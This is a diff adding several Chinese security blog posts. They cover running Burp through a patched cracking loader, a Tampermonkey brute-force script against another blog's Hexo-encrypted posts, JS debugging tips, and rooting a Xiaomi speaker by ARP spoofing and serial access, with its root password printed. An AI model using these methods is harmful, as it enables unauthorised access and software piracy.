@@ -292,6 +292,1092 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/08/mac上多版本burp共存/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/09/08/mac上多版本burp共存/" itemprop="url">mac上多版本burp共存</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-08T22:40:30+08:00">
+                2020-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#0x00 背景<br>某天群里有人问mac上如何共存多个版本的burp，大家都知道这个问题的本质是多版本jdk来驱动burp的问题，本来想想只需要更改环境变量来切换不同的java_home就好了吧，但其实好像并没有那么简单</p>
+<p>#0x01 常规尝试<br>首先我们要实现的是希望有多个burp的app图标，然后每个burp的图标点击就能启动不同的burp类似于：<br><img src="https://i.loli.net/2020/09/08/I3G1FTeSPfl7m5r.jpg" alt><br>要实现这个我们得用到mac自带的automator：<br><img src="https://i.loli.net/2020/09/08/FcubE4zUofhdyYT.jpg" alt><br>这玩意是真的好用，可以将很多命令操作或者宏打包成一个app，我们现在要用的是打包一个shell脚本，思路很简单，通过automator的shell，编写通过shell的方式运行指定的burploader就行：<br><img src="https://i.loli.net/2020/09/08/ZfjaUd6stJzNVyA.jpg" alt><br>类似于这样，就可以打包成一个app，然后就自动打开burp了<br>好了回到正题，正常思路下我们可能会想到通过在shell里指定运行的java命令的版本就行，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91</span><br><span class="line">xxx/xxx/xx/jdk14/bin/java -jar Loader.jar</span><br></pre></td></tr></table></figure></p>
+<p>看似可行，实则不行</p>
+<p>##0x02 问题分析<br>其实我们在shell里指定特定版本的java来运行loader的时候，这个loader确实是以该版本的java来运行的，我们要知道，loader只是为了破解，真正运行burp本身程序的是loader通过调用命令来运行的。loader调用命令的时候执行的是：<br><img src="https://i.loli.net/2020/09/08/pJ42GTiS1yNcCtk.jpg" alt><br>可以看到loader执行的依旧是“java”，也就是没有指定特定路径的java，那么他肯定是从环境变量去查找java，找到的那个Java是什么版本就是什么版本。那么问题来了，我们在shell里加入环境变量可不可行？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=xxxx/xxx/xxx/jdk14</span><br><span class="line">export PATH=xxxx/xxx/xxxx/bin:$PATH</span><br><span class="line">cd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91</span><br><span class="line">xxx/xxx/xx/jdk14/bin/java -jar Loader.jar</span><br></pre></td></tr></table></figure></p>
+<p>看起来可行，但是我试了，不行，看起来是这个环境变量只被loader继承了，并没有影响到loader调用命令时候的“java”，网上查了查，感觉讲的都不太靠谱，不深究，结果看来是依然调用的是系统本身的环境变量指向的java，也就是我本机老的1.8版本，那咋整呢？<br>我试过修改/usr/libexec/java_home这个玩意管理的javahome，将jdk14放入到目录<code>/Library/Java/JavaVirtualMachines/</code>并修改iplist的优先级，这会改变系统默认的jdk版本，重启后确实会生效，但是这个太脑残了</p>
+<p>##0x03 换个思路<br>环境变量这个坑不想搞了，万一系统搞坏了也挺傻逼的，那怎么办呢？<br>既然通过指定jdk路径里的java来执行可以成功，那我们能不能把loader里面的java命令改成特定jdk里的java来运行burp呢？确实可以<br>首先，我们用jd-gui打开loader.jar<br><img src="https://i.loli.net/2020/09/08/hSLgkeiQZGRBd8P.jpg" alt><br>(红线部分是loader里run的那个命令，这里的java路径已经被我修改过了，没有修改的情况下应该就是写这个java)<br>我们可以看到jd已经帮我们反编译了，但是我们不能直接在jd里修改，那么我们先保存，保存后jd会保存为源码的形式<br>再获得保存的源码后，我们用idea创建一个java工程，然后把这些源码放到src里<br><img src="https://i.loli.net/2020/09/08/tkycv6TJ1eESOQN.jpg" alt><br>修改划线部分，指定jdk14里的java来执行后续的burp<br>修改完毕后，最重要的是编译了，要想完整的编译可能会有一大堆问题，反正我没有直接build项目成功过。<br>这边建议只编译enjoy.reversing.me这个包（右键点击包名选择单独构建），这样报错少，我这边就报了一个错，根据提示改一下就编译成功了<br>接下来只需要将我们需要的keygendialog.class文件即修改过编译好的class文件复制出来<br><img src="https://i.loli.net/2020/09/08/LBgd26cIWOGeDNY.jpg" alt><br>最后比较简单了，将原先的loader.jar用zip解压缩后，用上面的class替换同名class文件，然后重新压缩成zip后将后缀改为jar即可<br>修改后的jar包经过测试可以正常以特定的java来运行burp了，也不需要去修改系统的java版本了，很环保很开心。<br>剩下的就是回到最初用automator来做一个启动app即可</p>
+<p>##0x04 总结</p>
+<ol>
+<li>环境变量这个问题还是没怎么搞清楚，找个时间再看看，也可能有更科学的方式来做这个事情吧</li>
+<li>很多事情还是要多试试才知道，脑补不太可行</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/21/一次对hexo加密文章的解密试探/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/08/21/一次对hexo加密文章的解密试探/" itemprop="url">一次对hexo加密文章的解密尝试</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-21T20:40:30+08:00">
+                2020-08-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#0x00背景<br>某天群里分享了一个大佬的博客，文章都是很棒的，但是最新的文章都使用Hexo-Blog-Encrypt，网上基本也都推荐这个插件进行加密文章。那么我们想看文章又不知道密码，怎么办呢？</p>
+<p>#0x01思路<br>一开始觉得至少先试试爆破吧，但是打开burp发现输入密码的过程是前端js的解密流程，并不存在提交到服务端的请求包，所以burp的常规爆破就不行了。<br>那基本的思路就是这样：</p>
+<ol>
+<li>先看看加解密代码，如果代码比较垃圾可能可以绕过</li>
+<li>如果是正常的对称加密，则考虑爆破</li>
+<li>爆破可以浏览器模拟也可以其他语言重新加解密函数提高爆破速度</li>
+</ol>
+<p>#0x02先看js<br>由于博客是托管在GitHub上的，所以直接通过github克隆一份下来在本地会比较简单一些，当然直接打开也可以（由于特殊原因该博客必须克隆）<br>略过一些查找的过程，我们很快就找到了加解密的js文件<br><img src="https://i.loli.net/2020/08/20/LCGHNFjl5bKfRiD.jpg" alt><br>文件路径是xxx.com/lib/blog-encrypt.js<br>基本上可以看到使用了aes-cbc 256位加密，使用sha-256进行hash校验，只要写的没有太大问题应该不存在绕过的方式，基本上目前我只能使用爆破的方法了</p>
+<p>#0x03爆破前置准备<br>目前我打算直接使用js来进行爆破，爆破的流程基本上是：<br>前端提交密码字典文件-&gt;解析成字典-&gt;js直接提交密码触发对应解密函数-&gt;构造解密成功和失败的结果显示<br>逻辑想好了，这里介绍几个基本的知识点</p>
+<p>##chrome浏览器override<br>devtools里有个override功能可以用本地的js脚本替代页面上的原脚本<br>功能路径：sources-&gt;overrides<br><img src="https://i.loli.net/2020/08/20/tWinjOeXBd87g25.jpg" alt><br>这个功能的操作基本上就是先开启这个功能，然后以后在source-&gt;page里修改了某个js，就会直接在overrides里生成一个修改过的js做替换，后续只要修改overrides里的替换文件就会在对应网站里生效，哪怕是关掉浏览器下次访问也一样会以本地修改文件来生效，还是很靠谱的。</p>
+<p>##tampermonkey脚本的基本使用<br>这个也没什么好说的，会大致写就行，其实本质上就是在页面加载完成后（顺序可以设置）在页面上执行额外的自定义脚本，我们的主要爆破程序是写在这里的</p>
+<p>#0x04编写爆破脚本<br>编写的时候涉及到不少的问题，比如：</p>
+<ol>
+<li>输入密码错误的时候会弹窗提示，alert会中断所有脚本的执行，所以需要在js里把对应的alert给干掉，大部分都在那个encrypt脚本里自己找一下就行</li>
+<li>解密成功但是校验失败会输出乱码，不太懂这什么原因，部分密码输入都会出现这种问题，通过修改一些判断逻辑使这个不影响爆破</li>
+<li>页面输入框会在一些情况下被替换掉导致中断爆破，因此如果解密成功或者校验失败，使其作用于一个新的元素避免影响输入框<br>直接贴爆破脚本好了，我懒得分析一些细节，而且我目前还没有爆破出密码，也不太确定是不是哪里有问题，不过思路可以参考一下</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">// ==UserScript==</span><br><span class="line">// @name         解密hexo</span><br><span class="line">// @namespace    http://tampermonkey.net/</span><br><span class="line">// @version      0.1</span><br><span class="line">// @description  try to take over the world!</span><br><span class="line">// @author       You</span><br><span class="line">// @match        http://127.0.0.1:8000/*</span><br><span class="line">// @grant        none</span><br><span class="line">//@run-at document-end</span><br><span class="line">// ==/UserScript==</span><br><span class="line"></span><br><span class="line">(function() &#123;</span><br><span class="line">    &apos;use strict&apos;;</span><br><span class="line">    //创建一个元素用于上传密码字典</span><br><span class="line">    var uploadfile = document.createElement(&apos;input&apos;);</span><br><span class="line">    uploadfile.type=&quot;file&quot;;</span><br><span class="line">    uploadfile.id=&quot;file_id&quot;;</span><br><span class="line">    //在上传字典后调用readFile函数</span><br><span class="line">    uploadfile.onchange= readFile;</span><br><span class="line">    document.body.appendChild(uploadfile);</span><br><span class="line">    //创建ui事件用于向密码输入框发送keydown事件</span><br><span class="line">    var event = document.createEvent(&apos;UIEvents&apos;);</span><br><span class="line">    event.initUIEvent(&quot;keydown&quot;,false,true,null);</span><br><span class="line">    event.keyCode=13;</span><br><span class="line">    var passwords = &quot;&quot;;</span><br><span class="line">    var i =0;</span><br><span class="line"></span><br><span class="line">    function readFile() &#123;</span><br><span class="line">        //获取文件内容判断是否为空不为空读取文件内容</span><br><span class="line">        const objFile = document.getElementById(&apos;file_id&apos;);</span><br><span class="line">        if(objFile.value === &apos;&apos;) &#123;</span><br><span class="line">          alert(&apos;请选择文件！&apos;);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件</span><br><span class="line">        const files = objFile.files;</span><br><span class="line">        // 新建一个FileReader</span><br><span class="line">        const reader = new FileReader();</span><br><span class="line">        // 读取文件</span><br><span class="line">        reader.readAsText(files[0], &quot;UTF-8&quot;);</span><br><span class="line">        // 读取完文件之后会回来这里</span><br><span class="line">        reader.onload = function(e)&#123;</span><br><span class="line">          // 读取文件内容</span><br><span class="line">          const fileString = e.target.result;</span><br><span class="line">          //读取出来的文件内容是纯文本未分行的，下面根据换行分割成数组</span><br><span class="line">          const fileString2 = e.target.result.split(&apos;\n&apos;);</span><br><span class="line">          //打印内容助于排错</span><br><span class="line">          console.log(fileString2);</span><br><span class="line">          passwords = fileString2;</span><br><span class="line">          //加个timeout主要是我怕读文件太慢，异步所以稳一点</span><br><span class="line">          setTimeout(function()&#123;</span><br><span class="line">            if(passwords!=&quot;&quot;)&#123;</span><br><span class="line">                //通过interval来控制速度，同样因为异步，怕出错所以用了interval降低速度</span><br><span class="line">                var inter = setInterval(function()&#123;</span><br><span class="line">                    //使用debug来输出每次密码，用于排错和知道进度，因为debug的信息可以隐藏</span><br><span class="line">                    console.debug(passwords[i]);</span><br><span class="line">//设置密码空间的值为密码，并且发送keydown事件触发解密函数                  document.getElementById(&quot;hbePass&quot;).value=passwords[i];</span><br><span class="line">                    document.getElementById(&apos;hexo-blog-encrypt&apos;).dispatchEvent(event);</span><br><span class="line">                      setTimeout(function()&#123;</span><br><span class="line">                          if(i&lt;passwords.length)&#123;</span><br><span class="line">                              i++;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125;,20);</span><br><span class="line">                      //passwords是全局变量，这里通过控制i的自增来遍历passwords</span><br><span class="line">                      if(i==passwords.length)&#123;</span><br><span class="line">                      //当密码爆破完中断interval</span><br><span class="line">                          clearInterval(inter);</span><br><span class="line">                      &#125;</span><br><span class="line">                &#125;,5);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,500);</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Your code here...</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>#0x05效果<br><img src="https://i.loli.net/2020/08/20/1CBnE35hUDJvOso.jpg" alt><br>这里加了个上传文件的input，上传完就开始自动爆破<br><img src="https://i.loli.net/2020/08/20/CskZtlT4BzyJwuW.jpg" alt><br>如果我前面的调整没有问题，那么爆破正确的话console.log会输出正确正文<br>不过到我写完文章我也没有爆破成功- -</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/JS调试技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/21/JS调试技巧/" itemprop="url">js调试技巧</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-21T00:40:30+08:00">
+                2020-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#js调试的一些技巧</p>
+<p>##0x00 使用Chrome调试</p>
+<p>###1.devtools<br>使用Chrome自带的devtools进行直接调试基本上已经能满足绝大部份需求，抛开常见的断点、单步调试不说，我们来说说如何使用devtools对js进行修改调试。要实现这个功能主要是用devtools里的sources板块：<br><img src="https://i.loli.net/2020/06/23/2GUDc6M97OSexom.jpg" alt></p>
+<p>在souces板块里我们注意到左侧有几个选项：page、filesystem、overrides、content scripts、snippets。这里我主要讲一下overrides和snippets。</p>
+<p>####snippets<br>这个比较简单，更像是个可以执行一小段js的小功能，贴入任何js，可以单击run然后就执行了：<br><img src="https://i.loli.net/2020/06/23/BXlysDNQ5V46xnj.jpg" alt></p>
+<p>####overrides<br>这个功能比较像是直接通过本地文件修改js然后在线调试，其实不用这个功能我们也可以直接在page页面里通过选中特定的js直接进行编辑修改，但是这有个问题就是如果我们刷新页面修改就失效了，而这个ovrrides的功能就是类似于用本地的文件夹保存被我们修改过的文件，类似于持久化保存的概念，那么只要我们对任何该网站的源码进行修改（html、css、js），对应修改的部分就会在本地文件夹里生成一个修改版，后续就会用这个修改版覆盖网页源文件。操作步骤：</p>
+<pre><code>1. 设置overrides的本地文件夹
+2. 通过elements修改html、css
+3. 通过source-》page修改js（**只能修改源文件不能修改formate后的文件**）
+4. 修改后需要保存，command+S后就会进行保存，保存后会在override里生成文件
+</code></pre><p>操作十分简单，如果觉得修改没有格式化的js文件比较麻烦，可以先任意修改源文件，等待生成overrids文件后，后续直接在overrids里的js进行修改，这种方式是可以进行formate的，这样就很方便了，即使页面刷新也会直接执行:<br><img src="https://i.loli.net/2020/06/23/GPuzHRfKvMSX4lL.jpg" alt></p>
+<p>###2.使用Chrome插件<br>这个其实已经很常规了，推荐几个插件吧，具体的也不演示了：</p>
+<ul>
+<li>Vue devtools，调试vue用的，会探测页面中是否使用vue</li>
+<li>tampermonkey，在页面中任意执行脚本，这个不用过多介绍了</li>
+</ul>
+<p>##0x01 使用vscode调试js<br>在项目文件夹里加入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;chrome&quot;,</span><br><span class="line">    &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;Chrome against file&quot;,</span><br><span class="line">    &quot;sourceMaps&quot;:false,</span><br><span class="line">    &quot;file&quot;: &quot;$&#123;workspaceRoot&#125;/index.html&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会以文件的方式访问启动debug打开index.html<br>如果要以webserver的形式访问localhost的服务的话得启动一个webserver，可以通过配置或者自己启动，默认的配置需要自己启动一个webserver。下面是一个nodejs的调试配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;attach&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;Attach by Process ID&quot;,</span><br><span class="line">            &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;,</span><br><span class="line">            &quot;skipFiles&quot;: [</span><br><span class="line">                &quot;&lt;node_internals&gt;/**&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;启动程序&quot;,</span><br><span class="line">            &quot;skipFiles&quot;: [</span><br><span class="line">                &quot;&lt;node_internals&gt;/**&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;\\app.js&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;attach&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;Node: Nodemon&quot;,</span><br><span class="line">            &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;,</span><br><span class="line">            &quot;restart&quot;: true,</span><br><span class="line">            &quot;protocol&quot;: &quot;inspector&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/11/对小爱音箱的初步探索/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/11/对小爱音箱的初步探索/" itemprop="url">对小爱音箱的初步探索（一）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-11T00:40:30+08:00">
+                2020-06-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/杂类/" itemprop="url" rel="index">
+                    <span itemprop="name">杂类</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>##0x01使用bettercap进行中间人劫持<br>小爱音箱和我在同一个wifi下，最简单的方式就是通过arp攻击加上流量重定向到代理上进行匿名代理拦截，大致掩饰一下bettercap的流程：<br><img src="https://i.loli.net/2020/06/05/1NYhUfwRKPHx5sG.jpg" alt><br>这个环境下，我的mbp和小爱处于一个wifi下，小爱的地址是192.168.23.145，我开启arp攻击欺骗小爱，然后启用anyproxy功能将小爱的80流量引导到我的mbp上的burp端口10001。<br>另外burp这边的proxy上要勾选这个选项<br><img src="https://i.loli.net/2020/06/05/JjVUPszBdNq839g.jpg" alt><br>攻击成功后，我就能在burp上抓到小爱的80流量了。</p>
+<p>##0x02通过串口方式打开ssh<br>很无奈，小爱绝大部分都是https流量，我用上面同样的方式引导443到10001上，抓不到https，burp直接报证书校验错误。可见小爱大部分流量都是https并且校验证书。<br>为了获得更大的权限我现在只能将小爱敲开，然后通过串口进入他的身体后开启ssh：<br><img src="https://i.loli.net/2020/06/05/jbJ4PtxE2al3UQg.jpg" alt="IMG_6879"><br><img src="https://i.loli.net/2020/06/05/HWJgbTMtNUKOwCS.jpg" alt="IMG_6882-20200602-211727-"><br><img src="https://i.loli.net/2020/06/05/6gBn2xUQ5IRfZPv.jpg" alt="C0645BF3-7E09-43F4-B6F8-6E99F0A2AD98"><br>找到了串口后焊上排针<br><img src="https://i.loli.net/2020/06/05/9i5lyogVmCbrBOU.jpg" alt="IMG_6884"><br>插上杜邦线后连出来，这里我直接把他连出来方便以后用<br><img src="https://i.loli.net/2020/06/05/2vIJYg8OEXu5bRs.jpg" alt="IMG_6890"><br>通过usb转串口连上，putty设置成串口115200波特率，就能看到输出了：<br><img src="https://i.loli.net/2020/06/05/qId72PbojtGrTlQ.jpg" alt="IMG_6888"><br>可以看到，小爱其实是个LEDE的路由器（现在叫openwrt）</p>
+<p>##0x03获取root后分析小爱的相关情况<br>首先我要做的是开启ssh：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/dropbear/*</span><br><span class="line">dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key</span><br><span class="line">dropbear -r /etc/dropbear/dropbear_rsa_host_key</span><br></pre></td></tr></table></figure></p>
+<p>其中dropbear是嵌入式设备中爱用的一个ssh服务，执行完毕以上三句后试试是否可以SSH连接了，网上说root密码是空，然而并不是，我也懒得改密码直接打开/etc/shadow里抄出来放到cmd5里解密，这条记录是收费的。<br>解密得到密码：moer123456<br>至此就可以连接了。</p>
+<p>随后我们ps一下看一下：<br><img src="https://i.loli.net/2020/06/05/1V3U9rIXngR2a8K.jpg" alt="IMG_6891-20200603-074007-"><br>可以看到一些mi带头的服务，那些基本就是小米的服务，还有一些其他的大部分也是。</p>
